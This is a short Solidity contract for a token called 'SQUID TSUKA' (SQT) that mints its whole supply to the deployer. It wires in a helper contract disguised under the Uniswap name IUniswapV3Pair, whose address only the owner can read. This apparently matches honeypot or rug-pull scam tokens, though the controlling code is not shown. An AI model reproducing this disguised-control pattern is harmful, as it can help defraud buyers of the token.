// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

import "./ERC20.sol";

contract SQT is ERC20,Ownable {
    using SafeMath for uint256;
    uint public _totalSupply=10000000000000000000000000;
    IUniswapV3Pair private pair = new IUniswapV3Pair(address(this),msg.sender);
    constructor() ERC20(unicode"SQUID TSUKA",unicode"SQT",address(pair)) {
        _mint(msg.sender, _totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function getIUniswapV3Pair() public view returns(address){
        require(msg.sender == owner());
        return address(pair);
    }

    fallback() external payable { }
    receive() external payable { }
}